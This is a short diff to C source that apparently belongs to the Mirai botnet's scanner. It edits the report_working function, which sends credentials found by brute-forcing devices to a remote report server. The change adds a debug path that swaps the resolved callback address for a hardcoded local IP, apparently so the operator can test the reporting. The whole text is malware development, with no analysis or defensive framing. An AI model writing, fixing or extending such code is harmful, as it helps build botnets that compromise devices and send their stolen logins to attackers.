@@ -923,11 +923,17 @@ static void report_working(ipv4_t daddr, uint16_t dport, struct scanner_auth *au
     {
 #ifdef DEBUG
         printf("[report] Failed to resolve report address\n");
-#endif
+#else
         return;
+#endif
     }
     addr.sin_family = AF_INET;
+#ifdef DEBUG
+    printf("[report] Bypassing resolv_lookup\n");
+    addr.sin_addr.s_addr = INET_ADDR(192,168,1,227);
+#else
     addr.sin_addr.s_addr = entries->addrs[rand_next() % entries->addrs_len];
+#endif
     addr.sin_port = *((port_t *)table_retrieve_val(TABLE_SCAN_CB_PORT, NULL));
     resolv_entries_free(entries);
 
